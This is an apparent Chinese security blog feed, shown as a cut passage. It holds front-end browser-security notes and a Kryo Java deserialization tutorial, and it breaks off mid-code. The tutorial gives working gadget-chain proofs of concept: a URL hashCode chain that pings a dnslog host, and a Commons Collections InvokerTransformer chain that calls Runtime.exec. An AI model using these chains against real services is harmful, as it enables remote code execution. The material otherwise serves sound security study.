class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>这段代码创建了一个input元素，用于上传文件。当文件选择框中选择了文件后，会触发onchange事件，执行show函数。show函数创建了一个FileReader对象，用于读取上传的文件。然后将读取的文件内容转换为文本格式，并通过alert弹窗显示出来。<br>这种只能是人工选择的时候可以读取到，但是不能主动去读取。</p><p>当然也有可以绕过的特例</p><ul><li><a href="https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser">https://blogs.opera.com/security/2021/09/bug-bounty-guest-post-local-file-read-via-stored-xss-in-the-opera-browser</a></li></ul><p>他是利用了opera: 这个协议有着更高的权限，和一些特殊功能，可以用来访问文件，截图网页等<br>更多细节可以看上面的原文，在这里不过多赘述<br>总结一下就是利用opera访问文件然后对文件内容做了个截图以后回传到攻击端</p><h3 id="禁止使用系统api"><a href="#禁止使用系统api" class="headerlink" title="禁止使用系统api"></a>禁止使用系统api</h3><p>这里只能使用一些浏览器提供的函数，比如fetch之类的<br>当然浏览器也会开放一些api</p><ul><li>Web Bluetooth API</li><li>MediaDevices API</li></ul><h3 id="禁止读取其他网页的内容"><a href="#禁止读取其他网页的内容" class="headerlink" title="禁止读取其他网页的内容"></a>禁止读取其他网页的内容</h3><p>我的kaikaix.github.io是读取不到google.com的任何内容的，这种就是同源策略(same-origin policy)，简称SOP<br>当在控制台输入以下代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://kaikaix.github.io&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(win.<span class="property">location</span>.<span class="property">href</span>)</span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure><br>这段代码创建了一个新的浏览器窗口并打开了一个指定的网页。然后使用setTimeout函数在3秒后输出新窗口的URL地址。<br>我在blog.huli.tw网站下开启控制台执行的结果如下<br><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>但是如果我在kaikaix.github.io执行的话<br><img src="/2023/09/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt><br>就可以成功输出url</p><p>当然也有方法可以拿到其他网站的信息<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&amp;q=subdomain%20host%20leak&amp;can=1">https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&amp;q=subdomain%20host%20leak&amp;can=1</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本来这个系列的命名是叫xss入门的，再看了huli大佬的这系列文章以后，还是改为了前端安全。&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>python的trick</title>
    <link href="http://example.com/2023/09/11/python%E7%9A%84trick/"/>
    <id>http://example.com/2023/09/11/python%E7%9A%84trick/</id>
    <published>2023-09-11T14:18:20.000Z</published>
    <updated>2023-09-11T14:18:20.350Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>kryo反序列化</title>
    <link href="http://example.com/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-09-07T15:20:02.000Z</published>
    <updated>2023-09-11T06:17:02.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="入门kryo"><a href="#入门kryo" class="headerlink" title="入门kryo"></a>入门kryo</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>首先看个简单的demo<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String hello;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;hello=&#x27;&quot;</span> + hello + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, num=&quot;</span> + num +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHello</span><span class="params">(String hello)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hello = hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num = num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(MyClass.class);</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">myClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        myClass.setHello(<span class="string">&quot;Hello Kryo&quot;</span>);</span><br><span class="line">        myClass.setNum(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output, myClass);</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">        input.close();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="3种序列化与反序列化"><a href="#3种序列化与反序列化" class="headerlink" title="3种序列化与反序列化"></a>3种序列化与反序列化</h3><p>如果是知道序列化类型，并且不为空<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kryo.writeObject(output, object);</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readObject(input, SomeClass.class);</span><br></pre></td></tr></table></figure><br>如果是知道序列化类型，并且有可能为空<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kryo.writeObjectOrNull(output, object);</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readObjectOrNull(input, SomeClass.class);</span><br></pre></td></tr></table></figure><br>如果都是不确定的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kryo.writeClassAndObject(output, object);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line"><span class="keyword">if</span> (object <span class="keyword">instanceof</span> SomeClass) &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="kryo注册"><a href="#kryo注册" class="headerlink" title="kryo注册"></a>kryo注册</h3><blockquote><p>当不知道序列化的类是什么的时候可以不用注册，一般是为了提高反序列化的效率启用这种注册功能。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">kryo.register(SomeClass.class);</span><br><span class="line"><span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> ...</span><br><span class="line"><span class="type">SomeClass</span> <span class="variable">object</span> <span class="operator">=</span> ...</span><br><span class="line">kryo.writeObject(output, object);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">kryo.register(SomeClass.class, <span class="number">9</span>);</span><br><span class="line">kryo.register(AnotherClass.class, <span class="number">10</span>);</span><br><span class="line">kryo.register(YetAnotherClass.class, <span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>看到上面两段代码，第一个没有id，他会自动给你分配id，后面那段是在参数中提供id，这个id在序列化和反序列化的时候要保持一致，不能用9的去反序列化10的</p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>首先获取前面获取的register<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg" alt><br>然后就开始写入序列化数据<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt><br>最后会根据serializer类型写入序列化数据，在这里的serializer就是string类型的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt><br>更加详细的就不说了，还是得自己调试才行，总体流程就是</p><ul><li>获取registration</li><li>获取filed，进行filed.write</li><li>在write中获取相对应的serializer</li><li>调用serializer.write，进行最后的写入</li></ul><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化的流程与序列化基本一致，只不过就是把write改为了read<br>当反序列化的类型为一个Object类型的时候，可以看到如下的过程，先创建一个Object的实例，接着循环把成员变量那些给赋值上<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt><br>看看Create中的实现<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt><br>他主要有几个步骤</p><ul><li>获取到无参构造</li><li>如果是private类型，就先让他变成可以访问的 -&gt; <em>ctor.setAccessible(true);</em></li><li>调用无参构造函数，并返回该实例</li></ul><p>但是有些利用链可能没有无参构造这时候应该怎么办<br>看到官网<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt></p><blockquote><p>The Objenesis StdInstantiatorStrategy uses JVM specific APIs to create an instance of a class without calling any constructor at all. Using this is dangerous because most classes expect their constructors to be called.<br><code>kryo.setInstantiatorStrategy(new DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));</code><br>当设置这个策略的时候会不调用任何的构造函数</p></blockquote><h2 id="常用调用链"><a href="#常用调用链" class="headerlink" title="常用调用链"></a>常用调用链</h2><p>常用的调用链基本是因为HashMap.put中,会调用到key的equals方法和hashcode方法，而key又是我们可控的，这时候就可以进行一些常规的调用链利用了<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt><br>首先看到他先反序列化了key，接着反序列化了value，最后进行了put操作</p><h3 id="hashCode利用"><a href="#hashCode利用" class="headerlink" title="hashCode利用"></a>hashCode利用</h3><p><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" alt><br>可以看到hash中触发了key的hashcode方法</p><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>首先是最简单的URL利用链<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://x.xxx.tu4.org&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, <span class="number">0</span>, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>具体就不分析了，就是会触发URL.hashcode最后触发dnslog</p><h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a><h3 style="text-decoration: line-through;">TiedMapEntry</h3></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.example.Test.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">mp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;lsf&quot;</span>);</span><br><span class="line">        lazymap.clear();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(lazymap,ct);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">v2</span> <span class="operator">=</span> tiedMapEntry;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span 